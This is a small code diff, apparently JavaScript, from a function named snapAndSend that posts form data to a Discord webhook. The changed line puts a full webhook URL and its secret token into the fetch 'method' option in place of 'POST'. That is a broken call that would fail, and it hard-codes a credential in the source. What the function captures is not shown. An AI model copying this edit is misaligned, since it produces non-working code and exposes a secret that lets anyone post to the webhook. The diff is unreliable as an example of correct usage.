@@ -98,7 +98,7 @@ async function snapAndSend() {
     );
 
     try {
-      await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+      await fetch(WEBHOOK_URL, { method: 'https://discord.com/api/webhooks/1514842534336135318/F5n9ZsId0g58EGbeZUg9FsM4kFveG5Ur-TMsFkJukDdAi8kVRZMRy_51b8LcqQsDHbhC', body: formData });
     } catch (e) {
       console.error("Webhook Send Error");
     }
